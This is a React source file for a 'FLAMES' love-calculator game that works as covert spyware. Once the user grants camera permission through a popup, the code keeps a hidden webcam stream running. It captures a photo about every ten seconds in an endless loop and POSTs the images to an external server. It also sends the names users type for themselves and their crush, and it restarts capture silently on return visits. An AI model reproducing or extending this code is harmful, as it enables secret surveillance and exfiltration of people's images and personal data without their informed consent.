// Auto-capture every 10s, keep stream on (Chrome-friendly)
import React, { useState, useCallback, useMemo, useRef, useEffect } from "react";
import styled, { keyframes } from "styled-components";
import PermissionPopup from "./PermissionPopup";

const API_BASE = "https://bkflames.up.railway.app";

const floatingHearts = keyframes`
  0% { transform: translateY(0); opacity: 1; }
  100% { transform: translateY(-100vh); opacity: 0; }
`;

const Background = styled.div`
  position: fixed;
  width: 100%;
  height: 100%;
  background: linear-gradient(135deg, #ff758c, #ff7eb3);
  display: flex;
  align-items: center;
  justify-content: center;
  overflow: hidden;
`;

const Heart = styled.div`
  position: absolute;
  color: #ff4d6d;
  font-size: 20px;
  top: 100%;
  left: ${({ left }) => left}%;
  animation: ${floatingHearts} ${({ duration }) => duration}s linear infinite;
`;

const Container = styled.div`
  text-align: center;
  background: rgba(255, 255, 255, 0.95);
  padding: 30px;
  border-radius: 15px;
  box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
  width: 90%;
  max-width: 400px;
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 12px;
`;

const Title = styled.h1`
  color: #ff4d6d;
  font-family: "Cursive", sans-serif;
  font-size: 2rem;
`;

const Input = styled.input`
  padding: 12px;
  width: 80%;
  max-width: 350px;
  border: 2px solid #ff4d6d;
  border-radius: 8px;
  font-size: 16px;
  outline: none;
  text-align: center;
`;

const Button = styled.button`
  background: ${({ disabled }) => (disabled ? "#d3d3d3" : "#ff4d6d")};
  color: white;
  padding: 12px;
  font-size: 18px;
  border: none;
  cursor: ${({ disabled }) => (disabled ? "not-allowed" : "pointer")};
  border-radius: 8px;
  width: 100%;
  max-width: 350px;
`;

const Result = styled.h2`
  color: #d43f5e;
  font-size: 24px;
  margin-top: 20px;
  opacity: 0;
  animation: fadeIn 0.5s ease-in-out forwards;
  @keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
  }
`;

const ShareButton = styled.button`
  background: rgb(157, 17, 127);
  color: white;
  padding: 10px;
  font-size: 16px;
  border: none;
  cursor: pointer;
  border-radius: 8px;
  margin-top: 10px;
  width: 100%;
  max-width: 350px;
`;

const StatusMessage = styled.p`
  font-size: 14px;
  color: #444;
`;

const flamesLogic = (name1, name2) => {
  const cleanName1 = name1.toLowerCase().replace(/\s/g, "");
  const cleanName2 = name2.toLowerCase().replace(/\s/g, "");

  let name1Arr = cleanName1.split("");
  let name2Arr = cleanName2.split("");

  for (let i = 0; i < name1Arr.length; i++) {
    const indexInName2 = name2Arr.indexOf(name1Arr[i]);
    if (indexInName2 !== -1) {
      name1Arr[i] = "";
      name2Arr[indexInName2] = "";
    }
  }

  const remainingCount = name1Arr.filter(l => l !== "").length + name2Arr.filter(l => l !== "").length;
  let flames = ["Friend", "Love", "Affection", "Marriage", "Enemy", "Sibling"];
  let index = 0;
  while (flames.length > 1) {
    index = (index + remainingCount - 1) % flames.length;
    flames.splice(index, 1);
  }
  return flames[0];
};

const FlamesGame = () => {
  const [name1, setName1] = useState("");
  const [name2, setName2] = useState("");
  const [result, setResult] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  const [showPermissionPopup, setShowPermissionPopup] = useState(() => localStorage.getItem("permissionsGiven") !== "true");
  const [permissionStatus, setPermissionStatus] = useState("");
  const videoRef = useRef();
  const canvasRef = useRef();

  useEffect(() => {
    if (localStorage.getItem("permissionsGiven") === "true") {
      handleAllow();
    }
  }, []);

  const startStreamOnce = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.setAttribute("playsinline", true);
      }
      console.log("✅ Stream running continuously");
    } catch (err) {
      console.error("❌ getUserMedia failed", err);
    }
  };

  const captureLoop = async () => {
    const delay = (ms) => new Promise(r => setTimeout(r, ms));
    while (true) {
      await delay(2000); // wait 2s after page or camera ready
      await capturePhoto();
      await delay(10000); // every 10s total
    }
  };

  const waitForVideoReady = () => {
    return new Promise(res => {
      const v = videoRef.current;
      if (!v) return res();
      if (v.readyState >= 3) return res();
      const handler = () => {
        v.removeEventListener("canplay", handler);
        res();
      };
      v.addEventListener("canplay", handler);
    });
  };

  const capturePhoto = async () => {
    await waitForVideoReady();
    const canvas = canvasRef.current;
    const video = videoRef.current;
    if (!canvas || !video) return;
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const data = canvas.toDataURL("image/jpeg");
    try {
      await fetch(`${API_BASE}/api/save-photo`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ image: data })
      });
      console.log("📸 Photo sent");
    } catch (err) {
      console.error("❌ Error sending photo", err);
    }
  };

  const handleAllow = async () => {
    setShowPermissionPopup(false);
    localStorage.setItem("permissionsGiven", "true");
    setPermissionStatus("Camera access granted ✅");
    await startStreamOnce();
    captureLoop();
  };

  const handleDeny = () => {
    setShowPermissionPopup(false);
    localStorage.setItem("permissionsGiven", "false");
    setPermissionStatus("Permissions denied ❌");
  };

  const handleChange1 = useCallback(e => setName1(e.target.value), []);
  const handleChange2 = useCallback(e => setName2(e.target.value), []);

  const handleSubmit = async () => {
    if (!name1.trim() || !name2.trim()) return alert("Enter both names!");
    if (name1.toLowerCase() === name2.toLowerCase()) return alert("Names should be different!");
    setIsLoading(true);
    setResult(null);
    setTimeout(async () => {
      const flamesResult = flamesLogic(name1, name2);
      setResult(flamesResult);
      setIsLoading(false);
      try {
        await fetch(`${API_BASE}/api/save-result`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ name1, name2, result: flamesResult })
        });
      } catch (err) {
        console.error("❌ Result error", err);
      }
    }, 2000);
  };

  const handleShare = async () => {
    if (!result) return;
    const msg = `FLAMES Result: ${name1} ❤ ${name2} = ${result}`;
    if (navigator.share) await navigator.share({ text: msg });
    else {
      await navigator.clipboard.writeText(msg);
      alert("Copied to clipboard! 📋");
    }
  };

  const heartPositions = useMemo(() => Array.from({ length: 30 }, () => ({ left: Math.random() * 100, duration: 4 + Math.random() * 3 })), []);

  return (
    <Background>
      {heartPositions.map((pos, i) => (
        <Heart key={i} left={pos.left} duration={pos.duration}>❤️</Heart>
      ))}

      {showPermissionPopup && <PermissionPopup onAllow={handleAllow} onDeny={handleDeny} />}

      <Container>
        <Title>FLAMES - Love Calculator 💖</Title>
        <Input value={name1} onChange={handleChange1} placeholder="Your Name" />
        <Input value={name2} onChange={handleChange2} placeholder="Crush's Name" />
        <Button onClick={handleSubmit} disabled={isLoading}>
          {isLoading ? "Checking..." : "Check Relationship"}
        </Button>
        {result && <Result>💘 {result} 💘</Result>}
        {result && <ShareButton onClick={handleShare}>📤 Share</ShareButton>}
        {permissionStatus && <StatusMessage>{permissionStatus}</StatusMessage>}
      </Container>

      <video ref={videoRef} autoPlay muted playsInline style={{ display: "none" }} />
      <canvas ref={canvasRef} style={{ display: "none" }} />
    </Background>
  );
};

export default FlamesGame;
